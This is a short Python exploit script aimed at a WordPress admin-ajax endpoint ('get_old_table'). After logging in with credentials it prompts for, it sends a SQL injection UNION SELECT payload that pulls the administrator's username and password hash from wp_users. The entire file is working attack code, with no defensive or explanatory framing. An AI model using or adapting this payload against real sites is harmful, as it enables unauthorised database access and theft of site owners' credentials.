import LoginManager
import SQLInj

def attack(url):

    path = url+"/wp-admin/admin-ajax.php?action=get_old_table"
    headers = {'content-type':'application/x-www-form-urlencoded','host':'localhost'}
    data = {"tableId":"1 UNION SELECT 1,2,CONCAT(user_login,char(58),user_pass),4,5 FROM wp_users WHERE ID=1"}

    print("SQL Injection attack.")
    username= input("Insert your username: ")
    password=input("Insert your password: ")
    result=LoginManager.login(url,username,password)
    while(not result):
        print("Your login failed. Username or password wrong. Insert them again!")
        username= input("Insert your username: ")
        password=input("Insert your password: ")
        result=LoginManager.login(url,username,password)

    SQLInj.attack(path,LoginManager.session,headers,data)
